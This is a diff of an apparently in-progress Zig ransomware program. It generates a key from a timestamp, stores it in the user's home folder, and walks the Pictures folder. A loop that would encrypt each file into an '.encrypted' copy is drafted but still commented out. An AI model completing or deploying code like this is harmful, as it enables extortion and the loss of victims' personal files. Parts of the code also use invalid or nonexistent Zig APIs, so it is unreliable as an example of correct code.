@@ -8,6 +8,11 @@ const kf = @import("known-folders");
 const KnownFolder = kf.KnownFolder;
 
 const keyFileName = "key.txt";
+const idc = fs.Dir.OpenDirOptions{};
+
+const fails = error{
+    NoFolder,
+};
 
 pub fn main() anyerror!void {
     var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
@@ -15,11 +20,16 @@ pub fn main() anyerror!void {
 
     const alloc = arena.allocator();
 
-    const idc = fs.Dir.OpenDirOptions{};
-    var homeFolder = try kf.open(alloc, KnownFolder.home, idc) orelse return;
-    var targetFolder = try kf.open(alloc, KnownFolder.videos, idc) orelse return;
+    var homeFolder = try kf.open(alloc, KnownFolder.home, idc) orelse {
+        std.debug.print("bruh", .{});
+        return fails.NoFolder;
+    };
     defer homeFolder.close();
-    defer targetFolder.close();
+
+    var targetPath = try kf.getPath(alloc, KnownFolder.pictures) orelse {
+        std.debug.print("bruh v2", .{});
+        return fails.NoFolder;
+    };
 
     // Generate a random key
     const timeArr: [8]u8 = @bitCast(std.time.milliTimestamp());
@@ -29,10 +39,8 @@ pub fn main() anyerror!void {
         @memcpy(seed[(i * 8) .. (i * 8) + 8], timeArr[0..]);
     }
 
-    std.debug.print("{any}", .{seed});
-
     const t: i64 = @bitCast(seed[0..8].*);
-    std.debug.print("{d}", .{t});
+    _ = t;
 
     var prng = rand.ChaCha.init(seed);
     var key: [32]u8 = undefined;
@@ -41,30 +49,34 @@ pub fn main() anyerror!void {
     // Write the key to the key file
     try homeFolder.writeFile(keyFileName, &key);
 
-    // // Encrypt files in the folder
-    // while (true) |entry| {
-    //     const entryName = entry.name() orelse break;
-    //     if (entry.isDir()) continue;
-    //
-    //     const filePath = try std.build.pathAppend(null, targetFolder, entryName);
-    //     const encryptedFilePath = try std.build.pathAppend(null, targetFolder, entryName ++ ".encrypted");
-    //
-    //     const file = try os.openFile(filePath, .{ .read = true });
-    //     defer file.close();
-    //
-    //     const encryptedFile = try os.create(encryptedFilePath);
-    //     defer encryptedFile.close();
-    //
-    //     var buffer: [4096]u8 = undefined;
-    //     while (true) |readResult| {
-    //         _ = readResult;
-    //         const bytesRead = try file.read(buffer[0..]);
-    //         if (bytesRead == 0) break;
-    //
-    //         const encryptedBytes = encrypt(buffer[0..bytesRead], key);
-    //         try encryptedFile.writeAll(encryptedBytes[0..]);
-    //     }
-    // }
+    // Encrypt files in the folder
+    var targetFolder = try fs.openIterableDirAbsolute(targetPath, idc);
+    var it = targetFolder.iterate();
+    while (try it.next()) |entry| {
+        const entryName = entry.name;
+        // if (entry.isDir()) continue;
+
+        std.debug.print("Found: {s}\n", .{entryName});
+
+        // const filePath = try std.build.pathAppend(null, targetPath, entryName);
+        // const encryptedFilePath = try std.build.pathAppend(null, targetPath, entryName ++ ".encrypted");
+        //
+        // const file = try os.openFile(filePath, .{ .read = true });
+        // defer file.close();
+        //
+        // const encryptedFile = try os.create(encryptedFilePath);
+        // defer encryptedFile.close();
+        //
+        // var buffer: [4096]u8 = undefined;
+        // while (true) |readResult| {
+        //     _ = readResult;
+        //     const bytesRead = try file.read(buffer[0..]);
+        //     if (bytesRead == 0) break;
+        //
+        //     const encryptedBytes = encrypt(buffer[0..bytesRead], key);
+        //     try encryptedFile.writeAll(encryptedBytes[0..]);
+        // }
+    }
 }
 
 fn encrypt(data: []const u8, key: []const u8) []u8 {
